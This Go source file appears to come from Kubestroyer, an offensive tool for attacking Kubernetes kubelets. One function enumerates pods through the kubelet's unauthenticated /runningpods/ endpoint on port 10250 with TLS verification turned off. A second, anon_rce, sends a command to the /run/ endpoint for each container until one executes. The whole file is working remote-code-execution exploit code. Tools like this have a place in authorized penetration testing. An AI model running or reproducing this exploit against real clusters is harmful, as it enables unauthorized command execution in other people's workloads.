package pkg

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/Rolix44/Kubestroyer/utils"
)

func parse_pod(target string) *utils.RunningPods {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get("https://" + target + ":10250/runningpods/")
	if err != nil {
		log.Fatalf("Fail execute request on '%s'", target)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Print("Fail to read body")
	}

	if string(body) == "Unauthorized" {
		log.Fatalln(string(body))
	}

	if strings.HasPrefix(string(body), "Forbidden") {
		log.Fatalln(string(body))
	}

	pods := &utils.RunningPods{}

	err = json.Unmarshal(body, &pods)
	if err != nil {
		log.Fatalln(err)
	}
	return pods

}

func anon_rce(runpod *utils.RunningPods, target string) {
	fmt.Printf("Trying anon RCE using '%s' for '%s'\n\n", utils.RceCommand, target)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	for i := 0; i < len(runpod.Items); i++ {
		found := false
		for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
			namespace := runpod.Items[i].Metadata.Namespace
			pod := runpod.Items[i].Metadata.Name
			container := runpod.Items[i].Spec.Containers[j].Name
			url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
			method := "POST"

			payload := strings.NewReader("cmd=" + utils.RceCommand)

			client := &http.Client{}
			req, err := http.NewRequest(method, url, payload)

			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

			res, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer res.Body.Close()

			body, err := io.ReadAll(res.Body)
			if err != nil {
				fmt.Println(err)
				return
			}
			if body != nil && !strings.Contains(string(body), "failed") {
				found = true
				fmt.Println(string(body))
				break
			}
		}
		if found {
			break
		}
	}

	fmt.Println(utils.Split)

}
